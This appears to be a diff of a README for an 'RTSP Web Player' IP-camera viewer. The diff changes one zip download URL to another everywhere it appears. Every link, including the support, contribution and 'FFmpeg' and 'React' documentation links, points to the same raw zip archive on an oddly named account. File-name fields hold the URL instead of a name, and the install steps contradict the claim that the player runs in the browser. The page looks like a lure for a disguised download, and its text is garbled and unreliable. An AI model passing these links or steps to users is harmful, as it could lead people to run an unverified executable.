@@ -6,9 +6,9 @@ Welcome to the RTSP Web Player! This tool lets you easily watch multiple IP came
 
 ## 📦 Download the Application
 
-[![Download rtsp-web-player](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip%20Web%20Player-blue)](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip)
+[![Download rtsp-web-player](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip%20Web%20Player-blue)](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
 
-To download the RTSP Web Player, simply **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip).
+To download the RTSP Web Player, simply **visit this page to download**: [Releases Page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip).
 
 ## 📋 System Requirements
 
@@ -23,23 +23,23 @@ Make sure your computer meets these minimum requirements to run the RTSP Web Pla
 
 1. **Download the Application**
    
-   Visit the [Releases Page](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip) to find the latest version. Click on the download link for your operating system.
+   Visit the [Releases Page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip) to find the latest version. Click on the download link for your operating system.
 
 2. **Locate the Downloaded File**
 
-   Go to your computer's "Downloads" folder or the location where you saved the file. You should see a file named something like `https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip` for Windows or `https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip` for Mac.
+   Go to your computer's "Downloads" folder or the location where you saved the file. You should see a file named something like `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` for Windows or `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` for Mac.
 
 3. **Extract the Zip File**
 
-   - For Windows: Right-click the `https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip` file and select "Extract All."
-   - For macOS: Double-click the `https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip` file to unzip it.
+   - For Windows: Right-click the `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` file and select "Extract All."
+   - For macOS: Double-click the `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` file to unzip it.
 
 4. **Run the Application**
 
    Locate the extracted folder. Inside, you will find the application file:
 
-   - On Windows, double-click `https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip`.
-   - On macOS, double-click `https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip`.
+   - On Windows, double-click `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip`.
+   - On macOS, double-click `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip`.
 
 5. **Grant Permissions**
 
@@ -86,20 +86,20 @@ No, the RTSP Web Player runs entirely in your web browser. You do not need any a
 
 ## 📞 Support
 
-If you experience any issues or have questions about the RTSP Web Player, please visit the [support page](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip) to report an issue or ask for help from the community.
+If you experience any issues or have questions about the RTSP Web Player, please visit the [support page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip) to report an issue or ask for help from the community.
 
 ## 🤝 Contributing
 
-If you'd like to contribute to the project, visit our [GitHub page](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip) for details on how to get involved.
+If you'd like to contribute to the project, visit our [GitHub page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip) for details on how to get involved.
 
 ## 🔗 Additional Resources
 
-- [FFmpeg Documentation](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip)
-- [https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip Documentation](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip)
-- [React Documentation](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip)
+- [FFmpeg Documentation](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
+- [https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip Documentation](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
+- [React Documentation](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
 
 ## 🔄 Update the Application
 
-To ensure you have the latest features and fixes, regularly check for updates on the [Releases Page](https://raw.githubusercontent.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/src/rtsp-web-player_2.1.zip).
+To ensure you have the latest features and fixes, regularly check for updates on the [Releases Page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip).
 
 Thank you for choosing RTSP Web Player! Enjoy streaming your IP cameras with ease.
